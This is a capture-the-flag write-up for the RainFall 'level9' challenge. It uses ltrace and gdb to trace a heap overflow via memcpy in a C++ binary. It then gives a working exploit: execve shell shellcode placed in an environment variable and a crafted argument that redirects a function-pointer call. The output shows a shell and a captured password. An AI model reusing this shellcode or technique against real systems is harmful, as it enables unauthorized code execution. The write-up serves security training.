# LEVEL9

## Analysis

Let's try to give the code some input to see what's going on:
```bash
   level9@RainFall:~$ ltrace ./level9 AAAA BBBB CCCC
   __libc_start_main(0x80485f4, 4, 0xbffff7d4, 0x8048770, 0x80487e0 <unfinished ...>
   _ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                              = 0xb7fce990
   __cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                           = 0
   _Znwj(108, 0xbffff7d4, 0xbffff7e8, 0xb7d79e55, 0xb7fed280)                                                      = 0x804a008
   _Znwj(108, 5, 0xbffff7e8, 0xb7d79e55, 0xb7fed280)                                                               = 0x804a078
   strlen("AAAA")                                                                                                  = 4
   memcpy(0x0804a00c, "AAAA", 4)                                                                                   = 0x0804a00c
   _ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)                                         = 0xb7fce4a0
   +++ exited (status 11) +++

   level9@RainFall:~$ ltrace ./level9 $(python -c 'print "A" * 108')
   __libc_start_main(0x80485f4, 2, 0xbffff774, 0x8048770, 0x80487e0 <unfinished ...>
   _ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                              = 0xb7fce990
   __cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                           = 0
   _Znwj(108, 0xbffff774, 0xbffff780, 0xb7d79e55, 0xb7fed280)                                                      = 0x804a008
   _Znwj(108, 5, 0xbffff780, 0xb7d79e55, 0xb7fed280)                                                               = 0x804a078
   strlen("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                   = 108
   memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 108)                                                  = 0x0804a00c
   _ZNSt8ios_base4InitD1Ev(0x8049bb4, 0x41414147, 0x804a078, 0x8048738, 0x804a00c)                                 = 0xb7fce4a0
   +++ exited (status 71) +++

   level9@RainFall:~$ ltrace ./level9 $(python -c 'print "A" * 109')
   __libc_start_main(0x80485f4, 2, 0xbffff774, 0x8048770, 0x80487e0 <unfinished ...>
   _ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                              = 0xb7fce990
   __cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                           = 0
   _Znwj(108, 0xbffff774, 0xbffff780, 0xb7d79e55, 0xb7fed280)                                                      = 0x804a008
   _Znwj(108, 5, 0xbffff780, 0xb7d79e55, 0xb7fed280)                                                               = 0x804a078
   strlen("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                   = 109
   memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 109)                                                  = 0x0804a00c
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++
```

Ok so our input is put as src arg to memcpy and if we give a length of 109 (As in ou case) it segfaults. Let's try to see what
happens in gdb:
```
   (gdb) run $(python -c 'print "A" * 109')
   Program received signal SIGSEGV, Segmentation fault.
   0x54000000 in ?? ()
   (gdb) info registers
   eax            0x804a078        134520952
   ecx            0x41     65
   edx            0x54000000       1409286144
   ebx            0x804a078        134520952
   esp            0xbffff26c       0xbffff26c
   ebp            0xbffff298       0xbffff298
   esi            0x0      0
   edi            0x0      0
   eip            0x54000000       0x54000000
   [...]
   (gdb) bt
   #0  0x54000000 in ?? ()
   #1  0x08048695 in main ()
```
Ok so we corrupted some data including eip, edx, but also ecx where we can find the first "A" after our potential offset.
If we give the exact payload amount we got:
```
   (gdb) run $(python -c 'print "A" * 112')
   eax            0x41414141       1094795585
   ecx            0x41414141       1094795585
   edx            0x804a07c        134520956
   ebx            0x804a078        134520952
   esp            0xbffff270       0xbffff270
   ebp            0xbffff298       0xbffff298
   esi            0x0      0
   edi            0x0      0
   eip            0x8048682        0x8048682 <main+142>
```

But we see something interesting in the code:
```
   0x08048682 <+142>:   mov    (%eax),%edx   <================== LINE1; segfault here
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx         <================== LINE2
```

In LINE1 there is a deference, the value at the address pointed by eax is passed to edx. Then in LINE2,
It is a call to a function whose address is stored in the register edx.

## Solution 

So what we could do is create an env var with a payload containing a shellcode, then with a right offset we could
give as input the address to our payload to be copied where memcpy returns and overflow eax passed to edx with 
memcpy return address. Like this, when the program calls *edx, it would actually go the the memory address that 
points to our shellcode:
```bash
   level9@RainFall:~$ export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
   level9@RainFall:~$ ./level9 $(python -c 'print "\xd9\xfc\xff\xbf" * 27 + "\x0c\xa0\x04\x08"')
   $ whoami
   bonus0
   $ cat /home/user/bonus0/.pass
   f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```